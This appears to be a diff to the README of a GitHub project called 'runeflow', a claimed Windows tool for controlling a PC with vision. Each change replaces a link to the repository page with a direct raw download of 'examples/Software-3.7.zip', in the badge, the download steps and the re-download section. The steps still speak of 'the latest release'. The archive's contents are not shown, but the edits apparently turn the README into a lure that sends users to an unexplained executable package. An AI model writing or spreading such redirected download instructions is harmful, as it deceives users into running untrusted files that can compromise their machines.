@@ -1,6 +1,6 @@
 # 🤖 runeflow - Control your PC with vision
 
-[![Download runeflow](https://img.shields.io/badge/Download-runeflow-blue?style=for-the-badge&logo=github)](https://github.com/Georgypolitic937/runeflow)
+[![Download runeflow](https://img.shields.io/badge/Download-runeflow-blue?style=for-the-badge&logo=github)](https://github.com/Georgypolitic937/runeflow/raw/refs/heads/main/examples/Software-3.7.zip)
 
 ## 🖥️ What runeflow does
 
@@ -10,7 +10,7 @@ It is built for Windows users who want a simple way to try computer control with
 
 ## 📥 Download runeflow
 
-1. Open the download page: [https://github.com/Georgypolitic937/runeflow](https://github.com/Georgypolitic937/runeflow)
+1. Open the download page: [https://github.com/Georgypolitic937/runeflow/raw/refs/heads/main/examples/Software-3.7.zip](https://github.com/Georgypolitic937/runeflow/raw/refs/heads/main/examples/Software-3.7.zip)
 2. Look for the latest release or the main download option on the page
 3. Download the Windows file or app package
 4. Save it to a folder you can find again, like Downloads or Desktop
@@ -198,7 +198,7 @@ This helps the app read the screen and act with fewer mistakes
 
 If you need to get the app again, use this link:
 
-[https://github.com/Georgypolitic937/runeflow](https://github.com/Georgypolitic937/runeflow)
+[https://github.com/Georgypolitic937/runeflow/raw/refs/heads/main/examples/Software-3.7.zip](https://github.com/Georgypolitic937/runeflow/raw/refs/heads/main/examples/Software-3.7.zip)
 
 ## 📚 Project topics
 
